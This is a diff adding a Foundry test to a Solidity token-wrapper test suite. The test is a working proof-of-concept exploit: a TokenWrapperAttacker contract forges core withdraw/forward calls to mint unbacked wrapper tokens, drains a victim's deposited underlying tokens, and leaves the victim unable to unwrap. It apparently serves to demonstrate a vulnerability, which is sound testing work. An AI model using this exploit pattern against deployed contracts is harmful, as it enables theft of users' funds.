@@ -72,9 +72,27 @@ contract TokenWrapperPeriphery is BaseLocker {
     }
 }
 
+contract TokenWrapperAttacker is BaseLocker {
+    constructor(ICore core) BaseLocker(core) {}
+
+    function steal(TokenWrapper wrapper, address recipient, uint128 amount) external {
+        lock(abi.encode(wrapper, recipient, amount));
+    }
+
+    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
+        (TokenWrapper wrapper, address recipient, uint128 amount) = abi.decode(data, (TokenWrapper, address, uint128));
+
+        ACCOUNTANT.withdraw(address(wrapper), recipient, amount);
+        ACCOUNTANT.forward(address(wrapper), abi.encode(int256(uint256(amount))));
+
+        return "";
+    }
+}
+
 contract TokenWrapperTest is FullTest {
     TokenWrapperFactory factory;
     TokenWrapperPeriphery periphery;
+    TokenWrapperAttacker attacker;
     TestToken underlying;
 
     function setUp() public override {
@@ -82,6 +100,7 @@ contract TokenWrapperTest is FullTest {
         underlying = new TestToken(address(this));
         factory = new TokenWrapperFactory(core);
         periphery = new TokenWrapperPeriphery(core);
+        attacker = new TokenWrapperAttacker(core);
     }
 
     function coolAllContracts() internal virtual override {
@@ -174,5 +193,39 @@ contract TokenWrapperTest is FullTest {
 
         periphery.unwrap(wrapper, 1);
         vm.snapshotGasLastCall("unwrap");
+    }
+
+    function testStealUnderlyingByForgingCoreTransfers() public {
+        TokenWrapper wrapper = factory.deployWrapper(IERC20(address(underlying)), 0);
+
+        uint128 victimDeposit = 1e18;
+        address victim = address(0xBEEF);
+
+        uint256 attackerInitial = underlying.balanceOf(address(this));
+        underlying.transfer(victim, victimDeposit);
+
+        vm.startPrank(victim);
+        underlying.approve(address(periphery), victimDeposit);
+        periphery.wrap(wrapper, victimDeposit);
+        vm.stopPrank();
+
+        assertEq(underlying.balanceOf(address(core)), victimDeposit, "Core should hold victim deposit");
+        assertEq(wrapper.balanceOf(victim), victimDeposit, "Victim wrapper balance mismatch");
+
+        attacker.steal(wrapper, address(this), victimDeposit);
+        assertEq(wrapper.balanceOf(address(this)), victimDeposit, "Attacker failed to mint wrappers");
+
+        wrapper.approve(address(periphery), victimDeposit);
+        periphery.unwrap(wrapper, victimDeposit);
+
+        assertEq(underlying.balanceOf(address(core)), 0, "Core drained");
+        assertEq(underlying.balanceOf(address(this)), attackerInitial, "Attacker recovered victim funds");
+        assertEq(wrapper.balanceOf(victim), victimDeposit, "Victim wrappers unchanged");
+
+        vm.startPrank(victim);
+        wrapper.approve(address(periphery), victimDeposit);
+        vm.expectRevert();
+        periphery.unwrap(wrapper, victimDeposit);
+        vm.stopPrank();
     }
 }
